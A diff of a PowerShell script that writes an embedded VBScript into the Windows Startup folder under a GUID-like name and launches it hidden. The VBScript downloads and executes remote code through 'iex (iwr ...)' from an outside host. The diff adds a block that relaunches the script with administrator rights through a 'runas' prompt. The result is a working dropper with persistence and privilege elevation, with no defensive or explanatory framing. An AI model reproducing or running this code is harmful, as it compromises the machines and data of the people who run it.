@@ -1,4 +1,10 @@
 $data = @"
+If Not WScript.Arguments.Named.Exists("elevate") Then
+  CreateObject("Shell.Application").ShellExecute WScript.FullName _
+    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
+  WScript.Quit
+End If
+
 Set oShell = CreateObject ("Wscript.Shell") 
 Dim strArgs
 strArgs = "cmd.exe /c powershell.exe iex (iwr -uri http://sovr.ml/setup.txt -usebasicparsing).content"
@@ -14,3 +20,4 @@ else{
     add-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs" -Encoding ASCII -value $data
     start-process -windowstyle Hidden "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs"
 }
+
